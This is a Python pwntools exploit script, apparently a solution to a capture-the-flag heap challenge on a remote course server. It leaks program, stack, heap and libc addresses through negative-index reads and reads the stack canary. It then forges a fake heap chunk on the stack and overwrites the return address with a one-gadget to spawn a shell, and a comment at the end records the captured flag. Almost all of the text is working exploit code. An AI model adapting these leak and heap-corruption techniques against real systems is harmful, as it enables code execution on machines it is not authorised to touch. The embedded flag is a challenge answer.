#!/usr/bin/python
from pwn import *
import sys
host = 'localhost'
port = 4000
host = 'csie.ctf.tw'
port = 10135




def add(size, content):
    r.recvuntil('>')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    if len(content) == size - 1:
        r.send(content)
    else:
        r.sendline(content)

def show(idx, debug=False):
    r.recvuntil('>')
    r.sendline('2')
    r.recvuntil(': ')
    r.sendline(str(idx))
    #if debug == True:
    #    r.interactive()
    return r.recvuntil('1. new')[:-6].strip('\n')

def free(idx):
    r.recvuntil('>')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))



# -26
stdout_base = 0x3c4620
stdin_base = 0x3c38e0
one_gadget = 0x45216
while 1:
    try:
        r = remote(host, port)

        text = u64(show(-2).strip().ljust(8, '\x00')) - 0xe50
        print ('text : ', hex(text))
        bss = text + 0x202000
        print ('bss : ', hex(bss))
        stack = u64(show(-6).strip().ljust(8, '\x00')) - 0xb0
        print ('stack : ', hex(stack))
        #while(1):
        #    x = int(raw_input())
        #    print hex(u64(show('-25'.ljust(8, '\x00') + p64(stack + (x * 8)))[:8].ljust(8, '\x00')))

        add(1, '') # 0
        add(1, '') # 1
        add(1, '') # 2
        free(1)
        free(0)

        add(1, '') # 0
        heap = u64(show('-25'.ljust(8, '\x00') + p64(stack)).ljust(8, '\x00')) - 0x10
        print ('heap : ', hex(heap))

        add(1, '') # 1
        stdout = u64(show('-25'.ljust(8, '\x00') + p64(bss + 0x10)).ljust(8, '\x00'))
        print ('stdout : ', hex(stdout))
        stdin = u64(show('-25'.ljust(8, '\x00') + p64(bss + 0x20)).ljust(8, '\x00'))


        libc = stdout - stdout_base
        print ('libc : ', hex(libc))
        libc = stdin - stdin_base
        print ('libc : ', hex(libc))
        one_gadget += libc
        print ('one_gadget : ', hex(one_gadget))
        canary = u64(show('-25'.ljust(8, '\x00') + p64(stack + 169), debug=True)[:7] + '\x00') << 8
        print ('canary : ', hex(canary))

        trying = ((stack >> 24) & 0xf0) - 0x10
        print ('trying : ', trying)
        if(trying < 0 or trying > 88):
            r.close()
            continue
        for i in range(9):
            add(trying, '') # 3, 4, 5, 6, 7, 8, 9, 10, 11
        # fake chunk on stack
        # 0x3d
        free('-25'.ljust(8, '\x00') + p64(heap + 0x70))
        free(4)
        free(3)
        add(trying, p64(stack - 0x43 - 0x8 + 0x26)) # 3
        add(trying, '') # 4
        add(trying, p64(stack - 0x43 - 0x8 + 0x26)) # 12
        show(0)
        add(trying-1, 'a'*13 + p64(one_gadget)) # 13
        #show()
        r.interactive()
        aksjdhasdhui
    except SystemExit:
        r.close()
    except:
        r.close()
        break

# FLAG{WTF!?!?D1d_y0u_r3411y_s0lv3D_THis???}
